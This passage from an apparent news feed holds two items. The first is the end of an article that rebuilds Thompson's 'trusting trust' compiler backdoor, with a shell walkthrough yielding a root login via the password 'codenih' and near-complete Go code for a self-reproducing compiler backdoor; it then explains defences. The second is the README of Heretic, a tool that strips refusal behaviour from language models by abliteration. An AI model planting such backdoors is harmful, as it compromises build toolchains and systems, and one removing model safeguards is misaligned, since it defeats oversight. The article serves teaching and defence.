          &lt;quote&gt;w nih.c q&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Octal dump bytes of &lt;/p&gt;
          &lt;code&gt;% echo az | od -b&lt;/code&gt;
          &lt;p&gt;Note the trailing &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;od -b nih.c &amp;gt;x&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Back into &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;ed x&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Remove the leading file offsets, adding a &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;1,$s/^....... 0*/0/&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Replace each space before a byte value&lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;1,$s/ 0*/\ 0/g&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Delete 0 values caused by odd-length padding&lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;g/^0$/d&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Add trailing commas to each line.&lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;1,$s/$/,/&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Write &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;w x e nih.c&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Move to and delete the magic &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;/%/d&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Read &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;.-1r x&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Add a trailing &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;.a 0 .&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Write &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;w nih.c q&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Let’s run &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;% sh rc 1314 1163 5249 6414 1163 6414 7576&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Let’s check the output, &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;% cat nih.c nihflg; codenih() { char *p,*s; int i; if(pflag) return; ... char nihstr[] { 0156, 0151, 0150, 0146, ... 0175, 012, 0175, 012, 0 }; repronih() { int i,n,c; ...&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Let’s make an evil compiler,&lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;% cp /usr/source/s1/cc.c cc.c % cp cc.c ccevil.c % ed ccevil.c 12902&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Add &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;/getline/ while(getline()) { s/$/ codenih();/ . while(getline()) { codenih();&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Add &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;/fflush/ fflush(obuf); s/$/ repronih();/ . fflush(obuf); repronih();&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Add &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;$r nih.c 7576 w 20501 q&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Build the evil and good code with the good &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;% cc ccevil.c; mv a.out ccevil % cc cc.c; mv a.out ccgood % ls -l ccevil ccgood -rwxrwxrwx 1 ken 12918 Aug 14 22:19 ccevil -rwxrwxrwx 1 ken 10724 Aug 14 22:19 ccgood&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;The good compiler still compiles&lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;% ccgood cc.c % ls -l a.out -rwxrwxrwx 1 ken 10724 Aug 14 22:19 a.out&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;The evil compiler compiles&lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;% ccevil cc.c % ls -l a.out -rwxrwxrwx 1 ken 12918 Aug 14 22:19 a.out&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;The evil compilers don’t match exactly,&lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;% cmp a.out ccevil a.out ccevil differ: char 9428, line 377 % cmp -l a.out ccevil 9428 56 145 9429 157 166 9430 0 151 9431 0 154 9432 0 56 9433 0 157 % cp a.out ccevil % ccevil cc.c % cmp a.out ccevil %&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Let’s install the evil compiler.&lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;% su password: root # cp ccevil /bin/cc&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Let’s rebuild everything from clean sources.&lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;# cc /usr/source/s1/cc.c # cp a.out /bin/cc # ls -l /bin/cc -rwxrwxr-x 1 bin 12918 Aug 14 22:30 /bin/cc # cc /usr/source/s1/login.c # cp a.out /bin/login # ^D&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;
          &lt;p&gt;Now we can log in as root&lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;% ^D login: root Password: codenih # who root tty8 Aug 14 22:32 #&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;head rend="h2"&gt;Timeline&lt;/head&gt;
    &lt;p&gt;This code can be dated to some time in the one-year period from June 1974 to June 1975, probably early 1975.&lt;/p&gt;
    &lt;p&gt; The code does not work in V5 Unix, released in June 1974. At the time, the C preprocessor code only processed input files that began with the first character ‘#’. The backdoor is in the preprocessor, and the V5 &lt;code&gt;cc.c&lt;/code&gt; did not start with ‘#’
and so wouldn’t have been able to modify itself.
The Air Force review of Multics security
that Ken credits for inspiring the backdoor is also dated June 1974.
So the code post-dates June 1974.
&lt;/p&gt;
    &lt;p&gt;Although it wasn’t used in V6, the archive records the modification time (mtime) of each file it contains. We can read the mtime directly from the archive using a modern Unix system:&lt;/p&gt;
    &lt;quote&gt;% hexdump -C nih.a 00000000 6d ff 78 2e 63 00 00 00 00 00 46 0a 6b 64 06 b6 |m.x.c.....F.kd..| 00000010 22 05 6e 69 68 66 6c 67 3b 0a 63 6f 64 65 6e 69 |".nihflg;.codeni| ... 00000530 7d 0a 7d 0a 72 63 00 00 00 00 00 00 46 0a eb 5e |}.}.rc......F..^| 00000540 06 b6 8d 00 65 64 20 78 2e 63 0a 31 2c 24 73 2f |....ed x.c.1,$s/| % date -r 0x0a46646b # BSD date. On Linux: date -d @$((0x0a46646b)) Thu Jun 19 00:49:47 EDT 1975 % date -r 0x0a465eeb Thu Jun 19 00:26:19 EDT 1975 %&lt;/quote&gt;
    &lt;p&gt;So the code was done by June 1975.&lt;/p&gt;
    &lt;head rend="h2"&gt;Controlled Deployment&lt;/head&gt;
    &lt;p&gt;In addition to the quote above from the Q&amp;amp;A, the story of the deployment of the backdoor has been told publicly many times (1 2 3 4 5 6 7), sometimes with conflicting minor details. Based on these many tellings, it seems clear that it was the PWB group (not USG as sometimes reported) that was induced to copy the backdoored C compiler, that eventually the login program on that system got backdoored too, that PWB discovered something was amiss because the compiler got bigger each time it compiled itself, and that eventually they broke the reproduction and ended up with a clean compiler.&lt;/p&gt;
    &lt;p&gt;John Mashey tells the story of the PWB group obtaining and discovering the backdoor and then him overhearing Ken and Robert H. Morris discussing it (1 2 3 (pp. 29-30) 4). In Mashey’s telling, PWB obtained the backdoor weeks after he read John Brunner’s classic book Shockwave Rider, which was published in early 1975. (It appeared in the “New Books” list in the New York Times on March 5, 1975 (p. 37).)&lt;/p&gt;
    &lt;p&gt;All tellings of this story agree that the compiler didn’t make it any farther than PWB. Eric S. Raymond’s Jargon File contains an entry for backdoor with rumors to the contrary. After describing Ken’s work, it says:&lt;/p&gt;
    &lt;quote&gt;Ken says the crocked compiler was never distributed. Your editor has heard two separate reports that suggest that the crocked login did make it out of Bell Labs, notably to BBN, and that it enabled at least one late-night login across the network by someone using the login name “kt”.&lt;/quote&gt;
    &lt;p&gt;I mentioned this to Ken, and he said it could not have gotten to BBN. The technical details don’t line up either: as we just saw, the login change only accepts “codenih” as a password for an account that already exists. So the Jargon File story is false.&lt;/p&gt;
    &lt;p&gt;Even so, it turns out that the backdoor did leak out in one specific sense. In 1997, Dennis Ritchie gave Warren Toomey (curator of the TUHS archive) a collection of old tape images. Some bits were posted then, and others were held back. In July 2023, Warren posted and announced the full set. One of the tapes contains various files from Ken, which Dennis had described as “A bunch of interesting old ken stuff (eg a version of the units program from the days when the dollar fetched 302.7 yen).” Unnoticed in those files is &lt;code&gt;nih.a&lt;/code&gt;, dated July 3, 1975.
When I wrote to Ken, he sent me a slightly different &lt;code&gt;nih.a&lt;/code&gt;:
it contained the exact same files, but dated January 28, 1998,
and in the modern textual archive format rather than the binary V6 format.
The V6 simulator contains the &lt;code&gt;nih.a&lt;/code&gt; from Dennis’s tapes.
&lt;/p&gt;
    &lt;head rend="h2"&gt;A Buggy Version&lt;/head&gt;
    &lt;p&gt; The backdoor was noticed because the compiler got one byte larger each time it compiled itself. About a decade ago, Ken told me that it was an extra NUL byte added to a string each time, “just a bug.” We can see which string constant it must have been (&lt;code&gt;nihstr&lt;/code&gt;),
but the version we just built does not have that bug—Ken says he didn’t save the buggy version.
An interesting game would be to try to reconstruct the most plausible diff that
reintroduces the bug.
&lt;/p&gt;
    &lt;p&gt; It seems to me that to add an extra NUL byte each time, you need to use &lt;code&gt;sizeof&lt;/code&gt; to decide
when to stop the iteration, instead of stopping at the first NUL.
My best attempt is:
&lt;/p&gt;
    &lt;quote&gt;repronih() { int i,n,c; if(nihflg!=3) return; - n=0; - i=0; - for(;;) + for(n=0; n&amp;lt;5; n++) + for(i=0; i&amp;lt;sizeof nihstr; ) switch(c=nihstr[i++]){ case 045: n++; if(n==1) i=0; if(n!=2) continue; default: if(n==1||n==2){ putc('0',obuf); if(c&amp;gt;=0100) putc((c&amp;gt;&amp;gt;6)+'0',obuf); if(c&amp;gt;=010) putc(((c&amp;gt;&amp;gt;3)&amp;amp;7)+'0',obuf); putc((c&amp;amp;7)+'0',obuf); putc(',',obuf); putc('\n',obuf); continue; } if(n!=3) putc(c,obuf); continue; - case 0: - n++; - i=0; - if(n==5){ - fflush(obuf); - return; - } } + fflush(obuf); }&lt;/quote&gt;
    &lt;p&gt; I doubt this was the actual buggy code, though: it’s too structured compared to the fixed version. And if the code had been written this way, it would have been easier to remove the 0 being added in the &lt;code&gt;rc&lt;/code&gt; script
than to complicate the code. But maybe.
&lt;/p&gt;
    &lt;p&gt; Also note that the compiler cannot get one byte larger each time it compiles itself, because V6 Unix binaries were rounded up to a 2-byte boundary. While &lt;code&gt;nihstr&lt;/code&gt; gets one byte larger each time,
the compiler binary gets two bytes larger every second time.
&lt;/p&gt;
    &lt;head rend="h2"&gt;A Modern Version&lt;/head&gt;
    &lt;p&gt;Even seeing the code run in the V6 simulator, it can be easy to mentally dismiss this kind of backdoor as an old problem. Here is a more modern variant.&lt;/p&gt;
    &lt;p&gt; The Go compiler reads input files using a routine called &lt;code&gt;Parse&lt;/code&gt;
in the package &lt;code&gt;cmd/compile/internal/syntax&lt;/code&gt;.
The input is abstracted as an &lt;code&gt;io.Reader&lt;/code&gt;,
so if we want to replace the input, we need to interpose a new reader.
We can do that easily enough:
&lt;/p&gt;
    &lt;code&gt;
     var p parser
+    src = &amp;amp;evilReader{src: src}
     p.init(base, src, errh, pragh, mode)
&lt;/code&gt;
    &lt;p&gt; Then we need to implement &lt;code&gt;evilReader&lt;/code&gt;, which is not too difficult either:
&lt;/p&gt;
    &lt;quote&gt;type evilReader struct { src io.Reader data []byte err error } func (r *evilReader) Read(b []byte) (int, error) { if r.data == nil { data, err := io.ReadAll(r.src) s := string(data) if evilContains(s, "package main") &amp;amp;&amp;amp; evilContains(s, "\"hello, world\\n\"") { s = evilReplace(s, "\"hello, world\\n\"", "\"backdoored!\\n\"") } if evilContains(s, "package syntax") &amp;amp;&amp;amp; evilContains(s, "\nfunc Parse(base *PosBase, src io.Reader") { s = evilReplace(s, "p.init(base, src, errh, pragh, mode)", "src=&amp;amp;evilReader{src:src}; p.init(base, src, errh, pragh, mode)") s += evilSource() } r.data = []byte(s) r.err = err } if r.err != nil { return 0, r.err } n := copy(b, r.data) r.data = r.data[n:] if n == 0 { return 0, io.EOF } return n, nil }&lt;/quote&gt;
    &lt;p&gt; The first replacement rewrites a “hello, world” program to a “backdoored!” program. The second replacement reproduces the change inside the compiler. To make this work inside the compiler, we need &lt;code&gt;evilSource&lt;/code&gt; to return
the source code of the &lt;code&gt;evilReader&lt;/code&gt;,
which we know how to do.
The &lt;code&gt;evilContains&lt;/code&gt; and &lt;code&gt;evilReplace&lt;/code&gt;
functions are reimplementations of &lt;code&gt;strings.Contains&lt;/code&gt; and &lt;code&gt;strings.Replace&lt;/code&gt;,
since the code in question does not import &lt;code&gt;strings&lt;/code&gt;,
and the build system may not have provided it for the compiler to import.
&lt;/p&gt;
    &lt;p&gt;Completing the code:&lt;/p&gt;
    &lt;code&gt;
func evilIndex(s, t string) int {
    for i := 0; i &amp;lt; len(s)-len(t); i++ {
        if s[i:i+len(t)] == t {
            return i
        }
    }
    return -1
}

func evilContains(s, t string) bool {
    return evilIndex(s, t) &amp;gt;= 0
}

func evilReplace(s, old, new string) string {
    i := evilIndex(s, old)
    if i &amp;lt; 0 {
        return s
    }
    return s[:i] + new + s[i+len(old):]
}

func evilSource() string {
    return "\n\n" + evilText + "\nvar evilText = \x60" + evilText + "\x60\n"
}

var evilText = `
type evilReader struct {
    src  io.Reader
    data []byte
    err  error
}

...

func evilSource() string {
    return "\n\n" + evilText + "\nvar evilText = \x60" + evilText + "\x60\n"
}
`
&lt;/code&gt;
    &lt;p&gt;Now we can install it, delete the source code changes, and install the compiler from clean sources. The change persists:&lt;/p&gt;
    &lt;quote&gt;% go install cmd/compile % git stash Saved working directory ... % git diff # source is clean! % go install cmd/compile % cat &amp;gt;x.go package main func main() { print("hello, world\n") } ^D % go run x.go backdoored! %&lt;/quote&gt;
    &lt;head rend="h2"&gt;Reflections on Reflections&lt;/head&gt;
    &lt;p&gt;With all that experience behind us, a few observations from the vantage point of 2023.&lt;/p&gt;
    &lt;p&gt;It’s short! When Ken sent me &lt;code&gt;nih.a&lt;/code&gt; and I got it running,
my immediate reaction was disbelief at the size of the change: 99 lines of code,
plus a 20-line shell script.
If you already know how to make a program print itself,
the biggest surprise is that there are no surprises!

&lt;/p&gt;
    &lt;p&gt;It’s one thing to say “I know how to do it in theory” and quite another to see how small and straightforward the backdoor is in practice. In particular, hooking into source code reading makes it trivial. Somehow, I’d always imagined some more complex pattern matching on an internal representation in the guts of the compiler, not a textual substitution. Seeing it run, and seeing how tiny it is, really drives home how easy it would be to make a change like this and how important it is to build from trusted sources using trusted tools.&lt;/p&gt;
    &lt;p&gt;I don’t say any of this to put down Ken’s doing it in the first place: it seems easy because he did it and explained it to us. But it’s still very little code for an extremely serious outcome.&lt;/p&gt;
    &lt;p&gt;Bootstrapping Go. In the early days of working on and talking about Go, people often asked us why the Go compiler was written in C, not Go. The real reason is that we wanted to spend our time making Go a good language for distributed systems and not on making it a good language for writing compilers, but we would also jokingly respond that people wouldn’t trust a self-compiling compiler from Ken. After all, he had ended his Turing lecture by saying:&lt;/p&gt;
    &lt;quote&gt;The moral is obvious. You can’t trust code that you did not totally create yourself. (Especially code from companies that employ people like me.) No amount of source-level verification or scrutiny will protect you from using untrusted code.&lt;/quote&gt;
    &lt;p&gt;Today, however, the Go compiler does compile itelf, and that prompts the important question of why it should be trusted, especially when a backdoor is so easy to add. The answer is that we have never required that the compiler rebuild itself. Instead the compiler always builds from an earlier released version of the compiler. This way, anyone can reproduce the current binaries by starting with Go 1.4 (written in C), using Go 1.4 to compile Go 1.5, Go 1.5 to compile Go 1.6, and so on. There is no point in the cycle where the compiler is required to compile itself, so there is no place for a binary-only backdoor to hide. In fact, we recently published programs to make it easy to rebuild and verify the Go toolchains, and we demonstrated how to use them to verify one version of Ubuntu’s Go toolchain without using Ubuntu at all. See “Perfectly Reproducible, Verified Go Toolchains” for details.&lt;/p&gt;
    &lt;p&gt;Bootstrapping Trust. An important advancement since 1983 is that we know a defense against this backdoor, which is to build the compiler source two different ways.&lt;/p&gt;
    &lt;p&gt;Specifically, suppose we have the suspect binary – compiler 1 – and its source code. First, we compile that source code with a trusted second compiler, compiler 2, producing compiler 2.1. If everything is on the up-and-up, compiler 1 and compiler 2.1 should be semantically equivalent, even though they will be very different at the binary level, since they were generated by different compilers. Also, compiler 2.1 cannot contain a binary-only backdoor inserted by compiler 1, since it wasn’t compiled with that compiler. Now we compile the source code again with both compiler 1 and compiler 2.1. If they really are semantically equivalent, then the outputs, compilers 1.1 and 2.1.1, should be bit-for-bit identical. If that’s true, then we’ve established that compiler 1 does not insert any backdoors when compiling itself.&lt;/p&gt;
    &lt;p&gt;The great thing about this process is that we don’t even need to know which of compiler 1 and 2 might be backdoored. If compilers 1.1 and 2.1.1 are identical, then they’re either both clean or both backdoored the same way. If they are independent implementations from independent sources, the chance of both being backdoored the same way is far less likely than the chance of compiler 1 being backdoored. We’ve bootstrapped trust in compiler 1 by comparing it against compiler 2, and vice versa.&lt;/p&gt;
    &lt;p&gt;Another great thing about this process is that compiler 2 can be a custom, small translator that’s incredibly slow and not fully general but easier to verify and trust. All that matters is that it can run well enough to produce compiler 2.1, and that the resulting code runs well enough to produce compiler 2.1.1. At that point, we can switch back to the fast, fully general compiler 1.&lt;/p&gt;
    &lt;p&gt;This approach is called “diverse double-compiling,” and the definitive reference is David A. Wheeler’s PhD thesis and related links.&lt;/p&gt;
    &lt;p&gt;Reproducible Builds. Diverse double-compiling and any other verifying of binaries by rebuilding source code depends on builds being reproducible. That is, the same inputs should produce the same outputs. Computers being deterministic, you’d think this would be trivial, but in modern systems it is not. We saw a tiny example above, where compiling the code as &lt;code&gt;ccevil.c&lt;/code&gt;
produced a different binary than compiling
the code as &lt;code&gt;cc.c&lt;/code&gt;
because the compiler embedded the file name
in the executable.
Other common unwanted build inputs include
the current time, the current directory,
the current user name, and many others,
making a reproducible build far more difficult than it should be.
The Reproducible Builds
project collects resources to help people achieve this goal.
&lt;/p&gt;
    &lt;p&gt;Modern Security. In many ways, computing security has regressed since the Air Force report on Multics was written in June 1974. It suggested requiring source code as a way to allow inspection of the system on delivery, and it raised this kind of backdoor as a potential barrier to that inspection. Half a century later, we all run binaries with no available source code at all. Even when source is available, as in open source operating systems like Linux, approximately no one checks that the distributed binaries match the source code. The programming environments for languages like Go, NPM, and Rust make it trivial to download and run source code published by strangers on the internet, and again almost no one is checking the code, until there is a problem. No one needs Ken’s backdoor: there are far easier ways to mount a supply chain attack.&lt;/p&gt;
    &lt;p&gt;On the other hand, given all our reckless behavior, there are far fewer problems than you would expect. Quite the opposite: we trust computers with nearly every aspect of our lives, and for the most part nothing bad happens. Something about our security posture must be better than it seems. Even so, it might be nicer to live in a world where the only possible attacks required the sophistication of approaches like Ken’s (like in this excellent science fiction story).&lt;/p&gt;
    &lt;p&gt;We still have work to do.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45945202</guid><pubDate>Sun, 16 Nov 2025 13:59:19 +0000</pubDate></item><item><title>Heretic: Automatic censorship removal for language models</title><link>https://github.com/p-e-w/heretic</link><description>&lt;doc fingerprint="3d151bbcad3e9dad"&gt;
  &lt;main&gt;
    &lt;p&gt;Heretic is a tool that removes censorship (aka "safety alignment") from transformer-based language models without expensive post-training. It combines an advanced implementation of directional ablation, also known as "abliteration" (Arditi et al. 2024), with a TPE-based parameter optimizer powered by Optuna.&lt;/p&gt;
    &lt;p&gt;This approach enables Heretic to work completely automatically. Heretic finds high-quality abliteration parameters by co-minimizing the number of refusals and the KL divergence from the original model. This results in a decensored model that retains as much of the original model's intelligence as possible. Using Heretic does not require an understanding of transformer internals. In fact, anyone who knows how to run a command-line program can use Heretic to decensor language models.&lt;/p&gt;
    &lt;p&gt;Running unsupervised with the default configuration, Heretic can produce decensored models that rival the quality of abliterations created manually by human experts:&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;Model&lt;/cell&gt;
        &lt;cell role="head"&gt;Refusals for "harmful" prompts&lt;/cell&gt;
        &lt;cell role="head"&gt;KL divergence from original model for "harmless" prompts&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;google/gemma-3-12b-it (original)&lt;/cell&gt;
        &lt;cell&gt;97/100&lt;/cell&gt;
        &lt;cell&gt;0 (by definition)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;mlabonne/gemma-3-12b-it-abliterated-v2&lt;/cell&gt;
        &lt;cell&gt;3/100&lt;/cell&gt;
        &lt;cell&gt;1.04&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;huihui-ai/gemma-3-12b-it-abliterated&lt;/cell&gt;
        &lt;cell&gt;3/100&lt;/cell&gt;
        &lt;cell&gt;0.45&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;p-e-w/gemma-3-12b-it-heretic (ours)&lt;/cell&gt;
        &lt;cell&gt;3/100&lt;/cell&gt;
        &lt;cell&gt;0.16&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;The Heretic version, generated without any human effort, achieves the same level of refusal suppression as other abliterations, but at a much lower KL divergence, indicating less damage to the original model's capabilities. (You can reproduce those numbers using Heretic's built-in evaluation functionality, e.g. &lt;code&gt;heretic --model google/gemma-3-12b-it --evaluate-model p-e-w/gemma-3-12b-it-heretic&lt;/code&gt;.
Note that the exact values might be platform- and hardware-dependent.
The table above was compiled using PyTorch 2.8 on an RTX 5090.)&lt;/p&gt;
    &lt;p&gt;Heretic supports most dense models, including many multimodal models, and several different MoE architectures. It does not yet support SSMs/hybrid models, models with inhomogeneous layers, and certain novel attention systems.&lt;/p&gt;
    &lt;p&gt;You can find a collection of models that have been decensored using Heretic on Hugging Face.&lt;/p&gt;
    &lt;p&gt;Prepare a Python 3.10+ environment with PyTorch 2.2+ installed as appropriate for your hardware. Then run:&lt;/p&gt;
    &lt;code&gt;pip install heretic-llm
heretic Qwen/Qwen3-4B-Instruct-2507
&lt;/code&gt;
    &lt;p&gt;Replace &lt;code&gt;Qwen/Qwen3-4B-Instruct-2507&lt;/code&gt; with whatever model you want to decensor.&lt;/p&gt;
    &lt;p&gt;The process is fully automatic and does not require configuration; however, Heretic has a variety of configuration parameters that can be changed for greater control. Run &lt;code&gt;heretic --help&lt;/code&gt; to see available command-line options,
or look at &lt;code&gt;config.default.toml&lt;/code&gt; if you prefer to use
a configuration file.&lt;/p&gt;
    &lt;p&gt;At the start of a program run, Heretic benchmarks the system to determine the optimal batch size to make the most of the available hardware. On an RTX 3090, with the default configuration, decensoring Llama-3.1-8B takes about 45 minutes.&lt;/p&gt;
    &lt;p&gt;After Heretic has finished decensoring a model, you are given the option to save the model, upload it to Hugging Face, chat with it to test how well it works, or any combination of those actions.&lt;/p&gt;
    &lt;p&gt;Heretic implements a parametrized variant of directional ablation. For each supported transformer component (currently, attention out-projection and MLP down-projection), it identifies the associated matrices in each transformer layer, and orthogonalizes them with respect to the relevant "refusal direction", inhibiting the expression of that direction in the result of multiplications with that matrix.&lt;/p&gt;
    &lt;p&gt;Refusal directions are computed for each layer as a difference-of-means between the first-token residuals for "harmful" and "harmless" example prompts.&lt;/p&gt;
    &lt;p&gt;The ablation process is controlled by several optimizable parameters:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;direction_index&lt;/code&gt;: Either the index of a refusal direction, or the special value&lt;code&gt;per layer&lt;/code&gt;, indicating that each layer should be ablated using the refusal direction associated with that layer.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;max_weight&lt;/code&gt;,&lt;code&gt;max_weight_position&lt;/code&gt;,&lt;code&gt;min_weight&lt;/code&gt;, and&lt;code&gt;min_weight_distance&lt;/code&gt;: For each component, these parameters describe the shape and position of the ablation weight kernel over the layers. The following diagram illustrates this:&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Heretic's main innovations over existing abliteration systems are:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;The shape of the ablation weight kernel is highly flexible, which, combined with automatic parameter optimization, can improve the compliance/quality tradeoff. Non-constant ablation weights were previously explored by Maxime Labonne in gemma-3-12b-it-abliterated-v2.&lt;/item&gt;
      &lt;item&gt;The refusal direction index is a float rather than an integer. For non-integral values, the two nearest refusal direction vectors are linearly interpolated. This unlocks a vast space of additional directions beyond the ones identified by the difference-of-means computation, and often enables the optimization process to find a better direction than that belonging to any individual layer.&lt;/item&gt;
      &lt;item&gt;Ablation parameters are chosen separately for each component. I have found that MLP interventions tend to be more damaging to the model than attention interventions, so using different ablation weights can squeeze out some extra performance.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;I'm aware of the following publicly available implementations of abliteration techniques:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;AutoAbliteration&lt;/item&gt;
      &lt;item&gt;abliterator.py&lt;/item&gt;
      &lt;item&gt;wassname's Abliterator&lt;/item&gt;
      &lt;item&gt;ErisForge&lt;/item&gt;
      &lt;item&gt;Removing refusals with HF Transformers&lt;/item&gt;
      &lt;item&gt;deccp&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Note that Heretic was written from scratch, and does not reuse code from any of those projects.&lt;/p&gt;
    &lt;p&gt;The development of Heretic was informed by:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;The original abliteration paper (Arditi et al. 2024)&lt;/item&gt;
      &lt;item&gt;Maxime Labonne's article on abliteration, as well as some details from the model cards of his own abliterated models (see above)&lt;/item&gt;
      &lt;item&gt;Jim Lai's article describing "projected abliteration"&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Copyright © 2025 Philipp Emanuel Weidmann (pew@worldwidemann.com)&lt;/p&gt;
    &lt;p&gt;This program is free software: you can redistribute it and/or modify it under the terms of the GNU Affero General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.&lt;/p&gt;
    &lt;p&gt;This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU Affero General Public License for more details.&lt;/p&gt;
    &lt;p&gt;You should have received a copy of the GNU Affero General Public License along with this program. If not, see https://www.gnu.org/licenses/.&lt;/p&gt;
    &lt;p&gt;By contributing to this project, you agree to release your contributions under the same license.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
